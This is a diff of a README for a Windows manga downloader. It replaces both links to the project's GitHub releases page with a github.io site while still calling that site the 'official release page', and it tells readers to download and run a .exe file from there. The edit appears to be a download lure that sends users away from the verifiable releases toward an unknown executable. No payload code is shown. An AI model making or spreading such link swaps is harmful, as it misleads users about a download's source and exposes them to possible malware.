@@ -1,6 +1,6 @@
 # 📖 mangak-downloader - Download your favorite manga series easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dyslexic-churchschool477/mangak-downloader/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dyslexic-churchschool477.github.io)
 
 This software downloads manga chapters from mangak.io to your computer. You choose the series, and the program saves the images for offline reading. The application provides a simple interface that hides complex technical tasks. You can download multiple chapters at the same time to save time.
 
@@ -8,7 +8,7 @@ This software downloads manga chapters from mangak.io to your computer. You choo
 
 You do not need to write code to use this tool. Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Dyslexic-churchschool477/mangak-downloader/releases).
+1. Go to the [official release page](https://dyslexic-churchschool477.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
